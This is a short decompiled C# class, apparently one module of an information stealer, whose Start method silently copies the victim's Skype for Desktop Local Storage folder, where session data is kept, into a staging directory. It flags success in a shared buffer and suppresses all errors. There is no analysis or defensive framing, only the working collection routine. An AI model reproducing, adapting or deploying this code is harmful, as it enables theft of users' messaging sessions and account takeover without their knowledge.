using System;
using System.IO;

// Token: 0x02000012 RID: 18
internal class Skype
{
	// Token: 0x0600002B RID: 43 RVA: 0x00004430 File Offset: 0x00002630
	public static void Start()
	{
		try
		{
			string text = string.Format("{0}Skype", global::Buffer.path_l);
			string text2 = string.Format("{0}Microsoft\\Skype for Desktop\\Local Storage", global::Buffer.path_ad);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				new DirectoryCopy(text2, string.Format("{0}\\Local Storage", text));
				global::Buffer.XBufferData[5] = "1";
				return;
			}
			File.WriteAllText(string.Format("{0}\\data.txt", text), string.Format("{0}", global::Buffer.head));
		}
		catch
		{
		}
		global::Buffer.XBufferData[5] = "0";
	}
}
